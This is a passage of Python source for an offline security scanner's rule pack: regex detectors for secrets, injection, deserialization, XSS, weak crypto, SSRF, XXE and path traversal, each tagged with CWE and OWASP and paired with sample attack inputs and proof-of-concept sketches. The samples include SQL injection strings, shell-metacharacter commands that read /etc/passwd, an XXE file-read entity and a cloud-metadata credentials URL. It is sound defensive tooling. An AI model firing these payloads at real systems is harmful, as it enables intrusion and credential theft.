# Copyright (c) 2026-present Navinspire IA
# SPDX-License-Identifier: AGPL-3.0-only

"""Offline rule pack for the security agent mode.

Line rules (``LINE_RULES``) cover injection, XSS, deserialization, crypto,
auth, SSRF, XXE, path traversal, secrets, TLS and misconfiguration across
Python, JS/TS, Go, Java/Kotlin, PHP, Ruby, C#, C/C++, shell, SQL, Terraform,
Dockerfile, Kubernetes, CI workflows and framework settings. Every rule carries
a CWE and an OWASP Top 10 (2021) tag plus a lab-safe payload and PoC sketch.
``file_checks`` adds whole-file checks and ``scan_dependencies`` flags known
vulnerable pinned versions without the network.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

_PLACEHOLDER = re.compile(
    r"(?i)(example|sample|placeholder|changeme|your[_-]?|xxx|todo|dummy|fake|"
    r"test[_-]?(key|token|secret)|<[^>]+>|\$\{|\{\{|process\.env|os\.environ|getenv|"
    r"redacted|your_|_here\b|replace[-_ ]?(me|with)|x{6,}|\*{4,}|•{3,}|\.{3,}|0{8,})"
)

# Values that are labels or prose, not credentials: letters, spaces and dashes only.
_LABEL_VALUE = re.compile(r"[:=]\s*[\"'][A-Za-z][A-Za-z _\-]*[\"']")
_SECRET_EXCLUDE = re.compile(
    "(?i)" + _PLACEHOLDER.pattern.replace("(?i)", "", 1) + "|" + _LABEL_VALUE.pattern
)

PY = {".py"}
JS = {".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs", ".vue", ".svelte"}
GO = {".go"}
JAVA = {".java", ".kt"}
PHP = {".php"}
RB = {".rb", ".erb"}
CS = {".cs"}
C = {".c", ".cc", ".cpp", ".h", ".hpp"}
SH = {".sh", ".bash"}
TF = {".tf", ".tfvars"}
YAML = {".yml", ".yaml"}
WEB_BACK = PY | JS | GO | JAVA | PHP | RB | CS


def _r(
    rid: str,
    sev: str,
    cat: str,
    summary: str,
    rec: str,
    pattern: str,
    *,
    exts: set[str] | None = None,
    cwe: str = "",
    owasp: str = "",
    ex: str = "",
    poc: str = "",
    exclude: re.Pattern[str] | None = None,
    conf: float = 0.78,
    flags: int = 0,
    code_only: bool = False,
) -> dict[str, Any]:
    return {
        "code_only": code_only,
        "id": rid,
        "severity": sev,
        "category": cat,
        "summary": summary,
        "recommendation": rec,
        "pattern": re.compile(pattern, flags),
        "exts": exts,
        "cwe": cwe,
        "owasp": owasp,
        "malicious_input_example": ex,
        "poc_sketch": poc,
        "exclude": exclude,
        "confidence": conf,
    }


_REQ = (
    r"(?:request\.|req\.|params\[|params\.|\$_(?:GET|POST|REQUEST|COOKIE|FILES)|"
    r"r\.(?:URL|FormValue|Form)|getParameter|searchParams|c\.(?:Query|Param)|flask\.request)"
)

A01, A02, A03, A04 = (
    "A01:2021 Broken Access Control",
    "A02:2021 Cryptographic Failures",
    "A03:2021 Injection",
    "A04:2021 Insecure Design",
)
A05, A06, A07, A08, A09, A10 = (
    "A05:2021 Security Misconfiguration",
    "A06:2021 Vulnerable Components",
    "A07:2021 Identification and Authentication Failures",
    "A08:2021 Software and Data Integrity Failures",
    "A09:2021 Logging and Monitoring Failures",
    "A10:2021 Server-Side Request Forgery",
)

LINE_RULES: list[dict[str, Any]] = [
    # ---- Secrets -----------------------------------------------------------
    _r("private-key", "critical", "Secrets", "Private key material in the repository",
       "Remove the key, rotate it, store it in a secrets manager.",
       r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY(?: BLOCK)?-----",
       cwe="CWE-321", owasp=A02, conf=0.95, exclude=re.compile(r"(?i)EXAMPLE|REPLACE_ME|redacted|YOUR_|_HERE|\\\\n")),
    _r("aws-key", "critical", "Secrets", "Hardcoded AWS access key id",
       "Revoke the key and use IAM roles or env vars.", r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b",
       cwe="CWE-798", owasp=A07, conf=0.9, exclude=_PLACEHOLDER),
    _r("github-token", "critical", "Secrets", "GitHub token committed",
       "Revoke the token on GitHub and use a secret store or Actions secrets.",
       r"\bgh[pousr]_[A-Za-z0-9]{30,}\b|\bgithub_pat_[A-Za-z0-9_]{40,}\b",
       cwe="CWE-798", owasp=A07, conf=0.95, exclude=_PLACEHOLDER),
    _r("slack-token", "high", "Secrets", "Slack token committed",
       "Revoke in Slack admin and load from a vault.", r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b",
       cwe="CWE-798", owasp=A07, conf=0.92, exclude=_PLACEHOLDER),
    _r("stripe-key", "critical", "Secrets", "Live Stripe secret key committed",
       "Roll the key in the Stripe dashboard and load it from env.",
       r"\b(?:sk|rk)_live_[A-Za-z0-9]{16,}\b", cwe="CWE-798", owasp=A07, conf=0.95, exclude=_PLACEHOLDER),
    _r("google-api-key", "high", "Secrets", "Google API key committed",
       "Restrict and rotate the key, move it server-side.", r"\bAIza[0-9A-Za-z_\-]{35}\b",
       cwe="CWE-798", owasp=A07, conf=0.9, exclude=_PLACEHOLDER),
    _r("openai-key", "critical", "Secrets", "LLM provider API key committed",
       "Revoke the key and load it from env or a vault.",
       r"\bsk-(?:proj-|ant-)?[A-Za-z0-9_\-]{32,}\b", cwe="CWE-798", owasp=A07, conf=0.9, exclude=_PLACEHOLDER),
    _r("sendgrid-key", "high", "Secrets", "SendGrid API key committed",
       "Revoke and rotate the key.", r"\bSG\.[A-Za-z0-9_\-]{16,}\.[A-Za-z0-9_\-]{30,}\b",
       cwe="CWE-798", owasp=A07, conf=0.92, exclude=_PLACEHOLDER),
    _r("db-url-credentials", "high", "Secrets", "Database URL with an inline password",
       "Move the DSN to a secret store; rotate the password.",
       r"(?i)\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqps?)://(?!(?:user(?:name)?|admin|root|[a-z]+):(?:password|pass|pwd|secret|[a-z]+)@)[^\s:/@\"']+:[^\s@\"']{4,}@(?!(?:localhost|127\.0\.0\.1|db|postgres|mysql|redis|mongo)(?::|/|$|[\"'\s]))",
       cwe="CWE-798", owasp=A07, conf=0.85, exclude=_PLACEHOLDER),
    _r("hardcoded-secret", "high", "Secrets", "Hardcoded secret or credential",
       "Move the value to env vars or a secrets vault, then rotate it.",
       r"(?i)\b(password|passwd|pwd|secret(?:[_-]?key)?|api[_-]?key|access[_-]?token|auth[_-]?token|client[_-]?secret|private[_-]?key)\b[\"']?\s*[:=]\s*[\"'][^\"'\s]{8,}[\"']",
       cwe="CWE-798", owasp=A07, conf=0.74, exclude=_SECRET_EXCLUDE),
    _r("hardcoded-secret-env", "high", "Secrets", "Secret value committed in an env or config file",
       "Keep .env out of git (.gitignore), rotate the exposed value.",
       r"(?i)^\s*(?:export\s+)?[A-Z0-9_]*(?:PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY)[A-Z0-9_]*\s*=\s*[^\s#\"'$<{][^\s#]{5,}",
       exts={".env", ".ini", ".cfg", ".conf", ".properties"}, cwe="CWE-798", owasp=A07, conf=0.8,
       exclude=_PLACEHOLDER),
    _r("conn-string-password", "high", "Secrets", "Connection string with an inline password",
       "Load the connection string from a secret store.",
       r"(?i)(?:password|pwd)\s*=\s*[^;\"'\s]{6,};", exts=CS | JAVA | {".config", ".xml"},
       cwe="CWE-798", owasp=A07, conf=0.8, exclude=_PLACEHOLDER),
    # ---- SQL injection -----------------------------------------------------
    _r("sql-injection", "critical", "Injection", "SQL built via string interpolation",
       "Use parameterized queries or an ORM.",
       r"(?i)(f[\"'][^\"']*(SELECT\s[^\"']*\sFROM\s|INSERT\s+INTO\s|UPDATE\s+\w+\s+SET\s|DELETE\s+FROM\s)[^\"']*\{"
       r"|[\"'`][^\"'`]*(SELECT\s[^\"'`]*\sFROM\s|INSERT\s+INTO\s|UPDATE\s+\w+\s+SET\s|DELETE\s+FROM\s)[^\"'`]*[\"'`]\s*(%|\+|\.format\()"
       r"|[\"'`][^\"'`]*(SELECT\s[^\"'`]*\sFROM\s|DELETE\s+FROM\s)[^\"'`]*(\$\{|#\{|\$\w+)"
       r"|\$\"[^\"]*(SELECT|DELETE|UPDATE|INSERT)\s[^\"]*\{|Sprintf\([\"'`][^\"'`]*(SELECT|DELETE|UPDATE|INSERT)\s)",
       cwe="CWE-89", owasp=A03, ex="' OR 1=1--",
       poc="Send `' OR 1=1--` (or a time-based `'; SELECT pg_sleep(5)--`) on the tainted field, then rewrite with bound parameters.",
       conf=0.85,
       exclude=re.compile(
           r"\{\s*(?:marks|qmarks|placeholders?|clause|where_clause|sets|cols|columns|fields|table|tbl|"
           r"where|order|order_by|joins?|limit|offset|schema|prefix|suffix|col|_?[A-Z][A-Z0-9_]+|self\.\w*(?:table|name|cols)\w*)\s*\}"
           r"|\{[^}]*\.join\(|\{\s*_?\w*(?:table|tbl)\w*\("
       )),
    _r("sql-concat-call", "critical", "Injection", "Query call receives a concatenated request value",
       "Pass values as bound parameters, never concatenate.",
       r"(?i)\b(?:query|execute|exec|executeQuery|raw|find_by_sql|where|mysql_query|mysqli_query|Query|Exec)\s*\(\s*[^)]*[\"'`]\s*(?:\+|\.)\s*" + _REQ,
       cwe="CWE-89", owasp=A03, ex="' UNION SELECT username,password FROM users--",
       poc="Inject a UNION payload through the concatenated parameter and watch extra columns come back.", conf=0.85),
    _r("sql-raw-var", "high", "Injection", "Raw SQL string with a request variable",
       "Use placeholders (?, %s, $1) and pass the value separately.",
       r"(?i)(?:mysql_query|mysqli_query|pg_query)\s*\([^)]*\$(?:_(?:GET|POST|REQUEST|COOKIE)|\w+)\b",
       exts=PHP, cwe="CWE-89", owasp=A03, ex="1 OR 1=1", poc="Pass `1 OR 1=1` as the id and compare row counts.", conf=0.8),
    _r("nosql-injection", "high", "Injection", "NoSQL operator or $where built from request input",
       "Validate types, strip `$` keys, avoid $where.",
       r"\$where\s*[\"']?\s*:\s*[\"'`][^\"'`]*[\"'`]\s*\+|findOne\(\s*\{[^}]*(?:req|request)\.(?:body|query|params)\.\w+",
       exts=JS, cwe="CWE-943", owasp=A03, ex='{"username":{"$ne":null},"password":{"$ne":null}}',
       poc="POST the operator object as JSON and confirm authentication succeeds without a password.", conf=0.78),
    # ---- Command injection / code execution --------------------------------
    _r("os-system", "critical", "Command injection", "Shell command built from a variable",
       "Use subprocess.run([...]) with an argv list and validate arguments.",
       r"\bos\.(?:system|popen)\s*\(\s*(?:f[\"']|[\"'][^\"']*[\"']\s*(?:\+|%)|[a-zA-Z_]\w*\s*[,)]|.*\+)",
       exts=PY, cwe="CWE-78", owasp=A03, ex="; id #", poc="Append `; id` to the parameter and look for uid= in the response.", conf=0.85, code_only=True),
    _r("shell-true", "high", "Command injection", "subprocess with shell=True",
       "Pass an argv list without shell=True.", r"shell\s*=\s*True", exts=PY,
       cwe="CWE-78", owasp=A03, conf=0.8, code_only=True),
    _r("node-exec", "critical", "Command injection", "child_process exec with a built string",
       "Use execFile/spawn with an argument array.",
       r"(?<![\w.])(?:exec|execSync)\s*\(\s*(?:[\"'`][^\"'`]*(?:[\"'`]\s*\+|\$\{)|[a-zA-Z_]\w*\s*[,)])",
       exts=JS, cwe="CWE-78", owasp=A03, ex="; cat /etc/passwd", poc="Inject `; cat /etc/passwd` and read the output.", conf=0.82),
    _r("go-exec-shell", "critical", "Command injection", "exec.Command through sh -c with a built string",
       "Call the binary directly with separate args.",
       r"exec\.Command\(\s*[\"'](?:sh|bash|cmd)[\"']\s*,\s*[\"'](?:-c|/c)[\"']\s*,\s*[^)]*\+",
       exts=GO, cwe="CWE-78", owasp=A03, ex="; id", poc="Inject `; id` in the concatenated argument.", conf=0.85),
    _r("java-exec", "critical", "Command injection", "Runtime.exec / ProcessBuilder with a concatenated string",
       "Use an argument array and an allow-list.",
       r"(?:Runtime\.getRuntime\(\)\.exec|new\s+ProcessBuilder)\s*\([^)]*\+", exts=JAVA,
       cwe="CWE-78", owasp=A03, ex="; id", poc="Inject a shell metacharacter into the parameter.", conf=0.85),
    _r("php-exec", "critical", "Command injection", "PHP command execution with request data",
       "Use escapeshellarg or avoid shelling out.",
       r"\b(?:system|exec|shell_exec|passthru|popen|proc_open)\s*\([^)]*(?:\$_(?:GET|POST|REQUEST|COOKIE)|\$\w+)",
       exts=PHP, cwe="CWE-78", owasp=A03, ex="; id", poc="Send `; id` in the parameter.", conf=0.85),
    _r("ruby-exec", "critical", "Command injection", "Ruby shell execution with interpolation",
       "Use the array form of system/Open3.",
       r"(?:\bsystem\s*\(?\s*[\"'][^\"']*#\{|`[^`]*#\{|%x\{[^}]*#\{|\bexec\s*\(?\s*[\"'][^\"']*#\{)",
       exts=RB, cwe="CWE-78", owasp=A03, ex="; id", poc="Inject `; id` into the interpolated value.", conf=0.85),
    _r("cs-process-start", "high", "Command injection", "Process.Start with a concatenated command",
       "Use ProcessStartInfo with ArgumentList and an allow-list.",
       r"Process\.Start\s*\([^)]*(?:\+|\$\")", exts=CS, cwe="CWE-78", owasp=A03, ex="& whoami", poc="Inject `& whoami`.", conf=0.82),
    _r("eval-exec", "high", "Code execution", "eval/exec with a dynamic argument",
       "Prefer explicit parsers (ast.literal_eval, JSON) or a lookup table.",
       r"(?<![\w.])(eval|exec)\s*\(\s*(?!['\"]\s*\))", exts=PY | JS | PHP | RB, cwe="CWE-95", owasp=A03,
       ex="__import__('os').system('id')", poc="Pass a benign marker expression and observe it execute.", conf=0.78, code_only=True,
       exclude=re.compile(r"compile\(|ast\.")),
    _r("js-new-function", "high", "Code execution", "new Function / string timer built from input",
       "Remove dynamic code generation; use a parser or a lookup table.",
       r"new\s+Function\s*\(|setTimeout\s*\(\s*(?:req|request)\.|setInterval\s*\(\s*(?:req|request)\.",
       exts=JS, cwe="CWE-95", owasp=A03, ex="process.mainModule.require('child_process').execSync('id')",
       poc="Send the payload as the code parameter.", conf=0.8),
    _r("ssti", "high", "Injection", "Template rendered from a request-built string (SSTI)",
       "Render fixed templates and pass user data as context only.",
       r"render_template_string\s*\([^)]*(?:\+|%|\.format|f[\"'])|Template\s*\([^)]*(?:\+|request\.)|render\s*(?:inline|:inline)\s*[:=>]+\s*params|render\s+inline:",
       cwe="CWE-1336", owasp=A03, ex="{{7*7}} / {{config}}", poc="Send `{{7*7}}` and check for 49 in the response.", conf=0.85, code_only=True),
    # ---- Deserialization ---------------------------------------------------
    _r("pickle", "high", "Deserialization", "Unsafe pickle/marshal deserialization",
       "Never unpickle untrusted data; prefer JSON.", r"\b(?:pickle|cPickle|dill|marshal|shelve)\.loads?\(",
       exts=PY, cwe="CWE-502", owasp=A08, conf=0.82, code_only=True),
    _r("yaml-load", "high", "Deserialization", "yaml.load without SafeLoader",
       "Use yaml.safe_load.", r"\byaml\.(?:load|unsafe_load)\s*\((?![^)]*Safe)", exts=PY,
       cwe="CWE-502", owasp=A08, conf=0.82, code_only=True),
    _r("java-deser", "critical", "Deserialization", "Java ObjectInputStream.readObject on untrusted data",
       "Use JSON, or an ObjectInputFilter allow-list.", r"\.readObject\s*\(|new\s+ObjectInputStream",
       exts=JAVA, cwe="CWE-502", owasp=A08, ex="ysoserial CommonsCollections payload",
       poc="Send a ysoserial gadget chain that runs a harmless marker command.", conf=0.78, code_only=True),
    _r("php-unserialize", "high", "Deserialization", "unserialize() on request data",
       "Use json_decode or pass allowed_classes=false.", r"\bunserialize\s*\(\s*\$",
       exts=PHP, cwe="CWE-502", owasp=A08, ex='O:8:"Exploit":0:{}', poc="Send a crafted serialized object through the cookie.", conf=0.85, code_only=True),
    _r("ruby-marshal", "high", "Deserialization", "Marshal.load / YAML.load on input",
       "Use JSON or YAML.safe_load.", r"\bMarshal\.load\b|\bYAML\.load\s*\(",
       exts=RB, cwe="CWE-502", owasp=A08, conf=0.82, code_only=True),
    _r("cs-binaryformatter", "high", "Deserialization", "BinaryFormatter / unsafe .NET deserializer",
       "Use System.Text.Json.", r"BinaryFormatter|NetDataContractSerializer|LosFormatter|TypeNameHandling\.(?:All|Auto|Objects)",
       exts=CS, cwe="CWE-502", owasp=A08, conf=0.85, code_only=True),
    _r("node-unsafe-deser", "high", "Deserialization", "node-serialize / unserialize on input",
       "Use JSON.parse with schema validation.", r"require\(['\"]node-serialize['\"]\)|\.unserialize\(",
       exts=JS, cwe="CWE-502", owasp=A08, conf=0.85),
    # ---- XSS ---------------------------------------------------------------
    _r("inner-html", "medium", "XSS", "Direct HTML injection sink",
       "Sanitize (DOMPurify) or use safe framework rendering.",
       r"dangerouslySetInnerHTML|\.(?:inner|outer)HTML\s*=|document\.write(?:ln)?\(|insertAdjacentHTML\s*\(|\bv-html\b|\{@html\b|bypassSecurityTrust(?:Html|Script|Url)",
       exts=JS | {".html"}, cwe="CWE-79", owasp=A03, ex="<img src=x onerror=alert(1)>",
       poc="Inject an HTML/JS marker into the rendered field.", conf=0.75, code_only=True,
       exclude=re.compile(r"JSON\.stringify|DOMPurify|sanitize")),
    _r("reflected-xss", "high", "XSS", "Request value written into an HTML response",
       "HTML-escape the value or use a templating engine with auto-escaping.",
       r"(?:res\.send|res\.write|response\.write|echo|print|Fprintf|w\.Write)\s*\(?[^;\n]*[\"'`]\s*<[^;\n]*(?:\+|\.)\s*" + _REQ
       + r"|echo\s+[^;]*\$_(?:GET|POST|REQUEST|COOKIE)|res\.send\([^)]*<[^)]*(?:req|request)\.(?:query|body|params)",
       cwe="CWE-79", owasp=A03, ex="<script>alert(document.domain)</script>", poc="Send the script tag in the parameter and see it echoed raw.", conf=0.82),
    _r("rails-raw", "medium", "XSS", "raw / html_safe on request data",
       "Remove raw/html_safe or sanitize.", r"\braw\s*\(?\s*params|\.html_safe\b", exts=RB,
       cwe="CWE-79", owasp=A03, ex="<svg onload=alert(1)>", poc="Submit the SVG payload.", conf=0.8),
    # ---- Crypto ------------------------------------------------------------
    _r("weak-hash", "medium", "Cryptography", "MD5 used (broken for passwords and signatures)",
       "Use argon2/bcrypt for passwords and SHA-256+ for integrity.",
       r"hashlib\.md5\(|createHash\(\s*[\"']md5[\"']\)|md5\.New\(\)|MessageDigest\.getInstance\(\s*\"MD5\"|\bmd5\s*\(\s*\$|MD5\.Create\(\)|Digest::MD5|MD5PasswordHasher|\bmd5\.Sum\(",
       cwe="CWE-327", owasp=A02, ex="md5(password)", poc="Crack a leaked hash offline with a rainbow table.", conf=0.78, code_only=True,
       exclude=re.compile(r"usedforsecurity\s*=\s*False")),
    _r("weak-hash-sha1", "low", "Cryptography", "SHA-1 used (collision-prone; fine only for non-security fingerprints)",
       "Use SHA-256+ for signatures and argon2/bcrypt for passwords.",
       r"hashlib\.sha1\(|createHash\(\s*[\"']sha1[\"']\)|sha1\.New\(\)|MessageDigest\.getInstance\(\s*\"SHA-?1\"|SHA1\.Create\(\)|Digest::SHA1|\bsha1\s*\(\s*\$",
       cwe="CWE-328", owasp=A02, conf=0.7, code_only=True, exclude=re.compile(r"usedforsecurity\s*=\s*False")),
    _r("weak-cipher", "high", "Cryptography", "Weak cipher or ECB mode",
       "Use AES-GCM or ChaCha20-Poly1305 with random nonces.",
       r"Cipher\.getInstance\(\s*\"(?:DES|DESede|RC4|Blowfish|AES/ECB|AES\")|\bDES\.Create\(|\bRC2\.Create\(|createCipher(?:iv)?\(\s*[\"'](?:des|rc4|aes-\d+-ecb)|MODE_ECB|AES\.new\([^)]*MODE_ECB|rc4|des\.NewCipher",
       cwe="CWE-327", owasp=A02, conf=0.8, code_only=True),
    _r("insecure-random", "medium", "Cryptography", "Non-cryptographic RNG for a security value",
       "Use secrets / crypto.randomBytes / SecureRandom.",
       r"(?i)(?:token|secret|password|session|nonce|otp|key|salt)\w*\s*[=:(][^;\n]*(?:random\.random|random\.randint|Math\.random|new\s+Random\(|rand\.Intn|rand\(\)|mt_rand|uniqid)|(?:random\.random|Math\.random|mt_rand)\s*\([^)]*\)[^\n]*(?:token|session|password|reset)",
       cwe="CWE-338", owasp=A02, ex="predict next value from observed outputs", poc="Collect a few tokens and predict the next with a PRNG state recovery tool.", conf=0.72),
    _r("static-iv-key", "high", "Cryptography", "Hardcoded IV or key bytes",
       "Generate a random IV per message and load keys from a KMS.",
       r"(?i)\b(?:iv|nonce)\s*=\s*b?[\"'][^\"']{8,}[\"']|SecretKeySpec\(\s*\"[^\"]+\"\.getBytes",
       cwe="CWE-329", owasp=A02, conf=0.75, exclude=_PLACEHOLDER),
    _r("tls-verify-off", "high", "TLS", "TLS certificate verification disabled",
       "Re-enable verification; use a custom CA bundle if needed.",
       r"verify\s*=\s*False|rejectUnauthorized\s*:\s*false|InsecureSkipVerify\s*:\s*true|NODE_TLS_REJECT_UNAUTHORIZED[\"']?\]?\s*=\s*[\"']?0|ServerCertificateValidationCallback\s*=[^;]*=>\s*true|CURLOPT_SSL_VERIFYPEER\s*,\s*(?:false|0)|VERIFY_NONE|ssl\._create_unverified_context|TrustAllCerts|ALLOW_ALL_HOSTNAME_VERIFIER",
       cwe="CWE-295", owasp=A02, conf=0.85, code_only=True),
    _r("old-tls", "medium", "TLS", "Obsolete TLS/SSL protocol version enabled",
       "Require TLS 1.2+.", r"(?i)PROTOCOL_(?:SSLv2|SSLv3|TLSv1|TLSv1_1)\b|tls\.VersionTLS1[01]\b|TLSv1(?:\.1)?[\"']|SSLv3",
       cwe="CWE-326", owasp=A02, conf=0.8, code_only=True),
    _r("cleartext-http", "low", "TLS", "Plain HTTP endpoint for a non-local host",
       "Use HTTPS.", r"[\"']http://(?![\w.-]*localhost|127\.|0\.0\.0\.0|10\.|192\.168\.|\[::1\]|schemas\.|www\.w3\.org|purl\.org|example\.|[\w.-]*\.example\b|xmlns)[a-z0-9.\-]+\.[a-z]{2,}",
       exts=PY | JS | GO | JAVA | RB | CS | PHP, cwe="CWE-319", owasp=A02, conf=0.66, code_only=True),
    # ---- Auth / session ----------------------------------------------------
    _r("jwt-none", "high", "Authentication", "Weakened JWT verification",
       "Always verify signatures with an explicit strong algorithm.",
       r"(?i)(algorithms?\s*[:=]\s*\[[^\]]*[\"']none[\"']|algorithm\s*[:=]\s*[\"']none[\"']|verify_signature[\"']?\s*[:=]\s*False|ignoreExpiration\s*:\s*true|verify_exp[\"']?\s*:\s*False|jwt\.decode\([^)]*verify\s*=\s*False)",
       cwe="CWE-347", owasp=A07, ex='{"alg":"none"}', poc="Forge an unsigned token and call a protected route.", conf=0.88, code_only=True),
    _r("weak-jwt-secret", "high", "Authentication", "Short or guessable JWT/session secret",
       "Use a random 256-bit secret from a vault.",
       r"(?i)(?:jwt[_-]?secret|secret[_-]?key|signing[_-]?key|session[_-]?secret)\s*[:=]\s*[\"']?(?:secret|changeme|password|admin|test|dev|123\w*|[a-z0-9]{1,10})[\"']?\s*;?\s*$",
       cwe="CWE-798", owasp=A07, ex="hashcat -m 16500 token.jwt wordlist.txt", poc="Brute-force the HS256 secret with a wordlist.", conf=0.78),
    _r("insecure-cookie", "medium", "Session", "Cookie without Secure/HttpOnly",
       "Set Secure, HttpOnly and SameSite.",
       r"(?i)(?:secure\s*[:=]\s*(?:False|false)|httponly\s*[:=]\s*(?:False|false)|SESSION_COOKIE_SECURE\s*=\s*False|CSRF_COOKIE_SECURE\s*=\s*False|SESSION_COOKIE_HTTPONLY\s*=\s*False)",
       cwe="CWE-614", owasp=A05, ex="document.cookie", poc="Read the cookie from injected JS or sniff it over HTTP.", conf=0.8, code_only=True),
    _r("csrf-disabled", "high", "Session", "CSRF protection disabled",
       "Keep CSRF middleware on and use tokens.",
       r"(?i)@csrf_exempt|csrf\.exempt|skip_before_action\s*:verify_authenticity_token|csrf\(\)\.disable|\.csrf\(\s*\)\.disable|protect_from_forgery\s+with:\s*:null_session|WTF_CSRF_ENABLED\s*=\s*False|ValidateAntiForgeryToken.*false",
       cwe="CWE-352", owasp=A01, ex="<form action=https://victim/transfer method=post>", poc="Host an auto-submitting form on another origin.", conf=0.82),
    _r("auth-bypass-flag", "high", "Authentication", "Authentication or authorization switched off",
       "Remove the bypass, enforce checks server-side.",
       r"(?i)(?:permitAll\(\)\s*\.\s*anyRequest|authorizeRequests\(\)\s*\.\s*anyRequest\(\)\s*\.\s*permitAll|AllowAnonymous\b|login_required\s*=\s*False|skip_authentication|auth\s*[:=]\s*(?:false|False)\b)",
       cwe="CWE-862", owasp=A01, conf=0.7),
    _r("mass-assignment", "medium", "Access control", "Request body bound straight into a model (mass assignment)",
       "Allow-list the fields (strong params, DTO, pick).",
       r"(?:\.create\(\s*req\.body\s*\)|\.update\(\s*req\.body\s*\)|new\s+\w+\(\s*req\.body\s*\)|Object\.assign\([^,]+,\s*req\.body\)|\.permit!|params\.require\([^)]*\)\.permit!)",
       cwe="CWE-915", owasp=A01, ex='{"role":"admin","isAdmin":true}', poc="Add privileged fields to the body and check they persist.", conf=0.8),
    _r("prototype-pollution", "high", "Injection", "Merge of request data into an object (prototype pollution)",
       "Use a safe merge, freeze Object.prototype, reject __proto__ keys.",
       r"(?:_\.(?:merge|defaultsDeep|set)|\$\.extend\(\s*true|merge\()\s*\([^)]*(?:req|request)\.(?:body|query|params)|\[\s*['\"]__proto__['\"]\s*\]",
       exts=JS, cwe="CWE-1321", owasp=A03, ex='{"__proto__":{"isAdmin":true}}', poc="POST the payload then read {}.isAdmin.", conf=0.8),
    # ---- Files / SSRF / redirect / XXE ------------------------------------
    _r("path-traversal", "high", "Path traversal", "File path built from request input",
       "Resolve against a base dir and reject paths that escape it.",
       r"(?<![\w.])(?:open|readFile(?:Sync)?|createReadStream|sendFile|send_file|File\.(?:open|read)|fopen|file_get_contents|os\.Open|ioutil\.ReadFile|FileInputStream|new\s+File|include|require|include_once)\s*\([^;\n]*(?:\+|\.|%|,)\s*(?:" + _REQ + r")",
       cwe="CWE-22", owasp=A01, ex="../../../../etc/passwd", poc="Request `../../../../etc/passwd` and look for root:x:0:0.", conf=0.78),
    _r("path-traversal-var", "high", "Path traversal", "File opened from a path concatenated with a variable",
       "Use os.path.realpath/Path.resolve and check the prefix.",
       r"\bopen\(\s*[\"'][^\"']*[\"']\s*\+\s*\w+|(?:readFileSync|readFile|sendFile)\(\s*[\"'`][^\"'`]*[\"'`]\s*\+\s*\w+|send_file\(\s*f[\"'][^\"']*\{|send_file\s+[\"'][^\"']*#\{",
       cwe="CWE-22", owasp=A01, ex="../../etc/passwd", poc="Traverse with `../` sequences.", conf=0.74),
    _r("php-lfi", "critical", "Path traversal", "include/require of a request-controlled path (LFI/RFI)",
       "Map allowed page names to files; never include raw input.",
       r"\b(?:include|require)(?:_once)?\s*\(?\s*\$_(?:GET|POST|REQUEST|COOKIE)|\b(?:include|require)(?:_once)?\s*\(?\s*[^;]*\$_(?:GET|POST|REQUEST)",
       exts=PHP, cwe="CWE-98", owasp=A03, ex="php://filter/convert.base64-encode/resource=index", poc="Request the page param with a php://filter wrapper.", conf=0.9),
    _r("ssrf", "high", "SSRF", "Outbound request to a URL taken from request input",
       "Allow-list destinations, block link-local/private ranges and redirects.",
       r"(?:requests\.(?:get|post|put|head|request)|urllib\.request\.urlopen|urlopen|httpx\.(?:get|post)|fetch|axios(?:\.\w+)?|http\.(?:get|Get)|got|curl_init|file_get_contents|open-uri|HttpClient\.\w+|WebClient\.\w+|Net::HTTP\.\w+)\s*\(\s*(?:" + _REQ + r")",
       cwe="CWE-918", owasp=A10, ex="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
       poc="Point the parameter at the cloud metadata endpoint and look for credentials.", conf=0.76),
    _r("ruby-open-url", "high", "SSRF", "Kernel#open on request data",
       "Use Net::HTTP with an allow-list; open() also runs shell pipes.", r"\bopen\s*\(\s*params\[",
       exts=RB, cwe="CWE-918", owasp=A10, ex="|id", poc="Pass `|id` as the url.", conf=0.85),
    _r("redirect-input", "medium", "Redirect", "Redirect target taken from request input",
       "Only redirect to relative paths or an allow-list of hosts.",
       r"(?<![\w])(?:redirect(?:_to)?|sendRedirect|Redirect|header\s*\(\s*[\"']Location:)\s*\(?\s*[\"']?[^;\n(]*(?:request\.(?:args|GET|form|values|query_params|params|query)|req\.(?:query|body|params)|params\[|\$_(?:GET|POST|REQUEST)|r\.(?:URL|FormValue))",
       cwe="CWE-601", owasp=A01, ex="//evil.example", poc="Send `?next=//evil.example` and follow the Location header.", conf=0.72),
    _r("xxe", "high", "XXE", "XML parser with external entities / DTD enabled",
       "Disable DTDs and external entities; use defusedxml.",
       r"resolve_entities\s*=\s*True|XMLParser\([^)]*resolve_entities|XMLInputFactory\.newInstance|DocumentBuilderFactory\.newInstance|SAXParserFactory\.newInstance|SAXBuilder\(|DtdProcessing\.Parse|XmlResolver\s*=\s*new|libxml_disable_entity_loader\s*\(\s*false|LIBXML_NOENT|noent\s*:\s*true",
       cwe="CWE-611", owasp=A05, ex='<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
       poc="Post the DOCTYPE with the entity and look for file content in the response.", conf=0.72),
    _r("xml-stdlib", "low", "XXE", "Standard-library XML parser on possibly untrusted data",
       "Use defusedxml when the document comes from outside.",
       r"(?:\bET|ElementTree|etree|minidom|sax)\.(?:parse|fromstring|XML|parseString)\(", exts=PY,
       cwe="CWE-611", owasp=A05, conf=0.66, code_only=True),
    _r("zip-slip", "low", "Path traversal", "Archive extracted without path validation (Zip Slip)",
       "Validate each entry resolves inside the target directory.",
       r"\.extractall\s*\(|\.extract\s*\(|ZipEntry\b[^\n]*getName\(\)\s*\)\s*;|tar\.Extract|ZipArchive.*extractTo",
       exts=PY | JAVA | JS | PHP, cwe="CWE-22", owasp=A01, ex="../../../tmp/pwn in an archive entry name", poc="Upload an archive whose entry is `../../evil` and check where it lands.", conf=0.7, code_only=True),
    _r("file-upload", "high", "Upload", "Upload saved with the client-supplied filename",
       "Generate the name server-side, check type/size, store outside the web root.",
